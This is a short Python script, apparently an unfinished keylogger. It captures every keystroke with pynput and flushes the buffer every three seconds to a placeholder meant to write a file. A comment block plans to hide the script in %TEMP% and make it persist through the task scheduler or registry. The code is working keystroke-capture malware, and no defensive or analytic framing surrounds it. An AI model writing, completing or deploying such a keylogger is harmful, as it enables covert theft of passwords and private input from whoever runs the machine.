from pynput.keyboard import Key, Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
from threading import Lock
import schedule
from time import sleep


'''
python a.py
python a.py --balagan
__name__ -> %TEMP%  ?
python a.py --balagan

%TEMP%

task schedular / registry
'''

keys = []
keysLock = Lock()

do_exit = False

def on_key_release(key):
    global keys, keysLock, do_exit
    
    keysLock.acquire()
    keys.append(key)
    keysLock.release()
    
    if key == Key.esc: #for debug!.
        do_exit = True
        return False
    

def writeToFile():
    global keys, keysLock
    print('here')
    
    if keys == []:
        return

    keysLock.acquire()
    currentKeys = keys
    keys = []
    keysLock.release()
    
    #write currentKeys to the file.
    print('2', currentKeys)


schedule.every(3).seconds.do(writeToFile)

keyboard_listener = KeyboardListener(on_release=on_key_release)
keyboard_listener.start()





while not do_exit:
    schedule.run_pending()
    sleep(1)

keyboard_listener.join()

print('Escaping...')
